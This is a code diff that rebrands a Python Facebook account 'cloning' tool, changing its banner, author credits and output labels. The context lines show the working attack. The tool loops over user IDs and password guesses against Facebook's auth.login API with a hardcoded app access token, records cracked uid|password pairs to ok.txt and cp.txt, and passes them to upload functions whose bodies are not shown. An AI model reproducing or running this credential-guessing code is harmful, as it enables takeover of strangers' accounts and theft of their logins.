@@ -97,20 +97,24 @@ class Main:
 		os.system("clear")
 		
 		print ("""\033[1;92m _______    _____ ____  ____    _      ______    
-|_   __ \  |_   _|_  _||_  _|  / \    |_   _ `.  
-  | |__) |   | |   \ \  / /   / _ \     | | `. \ 
-  |  __ /    | |    \ \/ /   / ___ \    | |  | | 
- _| |  \ \_ _| |_   _|  |_ _/ /   \ \_ _| |_.' / 
-|____| |___|_____| |______|____| |____|______.'                                 
+
+$$$$$$$$\ $$$$$$\  $$$$$$\  
+\____$$  |\_$$  _|$$  __$$\ 
+    $$  /   $$ |  $$ /  $$ |
+   $$  /    $$ |  $$$$$$$$ |
+  $$  /     $$ |  $$  __$$ |
+ $$  /      $$ |  $$ |  $$ |
+$$$$$$$$\ $$$$$$\ $$ |  $$ |
+\________|\______|\__|  \__|                        
 \033[1;90m══════════════════════════════════════════════════
-\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Abubockor Riyad  
-\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : RR Termux Command 
-\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : RR-Hacker-Riyad
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : JULKAR NAYEN ZIA
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : UNKNOWN
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : JULK*R
 \033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWARNING  : Fuck My All Haters
 \033[1;90m══════════════════════════════════════════════════
     """)
 		print("%s [%s•%s] %sTOOL NAME : %sSuper Speed Uid Cloning"%(G,R,G,B,G))
-		print("%s [%s•%s] %sVERSION   : %s2.0"%(G,R,G,B,G))
+		print("%s [%s•%s] %sVERSION   : %s5.0"%(G,R,G,B,G))
 		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
 		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
 		print("")
@@ -435,7 +439,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]"
 		])
 		sys.stdout.write(
-			"\r\r %s[>_] [RR_OLD] : %s/%s -> \033[0;92m [ RR-OK:%s ]- \033[0;91m[RR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r %s[>_] [ZIA_OLD] : %s/%s -> \033[0;92m [ ZIA-OK:%s ]- \033[0;91m[ZIA-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -452,15 +456,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[RR-OK] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ZIA-OK] %s|%s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
-				open("ok.txt","a").write(" [RR-OK] %s|%s\n"%(uid, pw))
+				open("ok.txt","a").write(" [ZIA-OK] %s|%s\n"%(uid, pw))
 				uploadoks()
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;91m[RR-CP] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;91m[ZIA-CP] %s|%s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("cp.txt","a").write(" [RR-CP] %s|%s\n"%(uid, pw))
+				open("cp.txt","a").write(" [ZIA-CP] %s|%s\n"%(uid, pw))
 				uploadcps()
 				break
 			else:
